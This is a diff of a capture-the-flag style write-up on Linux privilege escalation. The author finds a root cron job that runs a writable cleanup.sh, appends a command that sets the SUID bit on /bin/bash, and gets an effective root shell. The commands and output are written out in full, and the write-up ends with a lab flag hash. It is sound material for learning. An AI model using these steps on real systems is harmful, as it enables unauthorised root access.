@@ -42,4 +42,34 @@ Interesting writable files owned by me or writable by everyone (not in Home) (ma
 
 ```
 
-- Whilst highlighting the 
+- Whilst highlighting the the cleanup.sh file. However checking `/etc/crontab` and `ls -la /etc/cron.*` , and `cat /var/spool/cron/crontabs/root` we dont see this file. As of fact when we run `cat /var/spool/cron/crontabs/root` we recieved a permissions denied, so the only way to tell if this file was actually being run by root on a schedule was to watch the processes live -> pspy.
+
+After about a minute pspy caught the cron job firing:
+```
+UID=0  PID=72876 | /usr/sbin/CRON -f
+UID=0  PID=72878 | /bin/sh -c /var/www/cleanup.sh
+UID=0  PID=72879 | rm -rf /var/log/apache2/error.log
+UID=0  PID=72880 | rm -rf /var/log/apache2/access.log
+```
+So UID=0 (root) runs `/var/www/cleanup.sh` every minute via cron. Thats the confirmation -> a file I can write to, executed by root. 
+
+Next I confirmed I could actually write to it:
+```
+ls -l /var/www/cleanup.sh
+```
+I had write access, so I appended a line to set the SUID bit on /bin/bash:
+```
+echo "chmod u+s /bin/bash" >> /var/www/cleanup.sh
+```
+Since root runs the script, root runs my chmod -> and root then changes perms on /bin/bash. Waited for the next minute tick, then:
+```
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1.2M ... /bin/bash    <- the 's' = SUID bit is now set
+
+/bin/bash -p
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
+
+Root flag -> a2a57aa689d9db40e19c708a6f9ab8f4
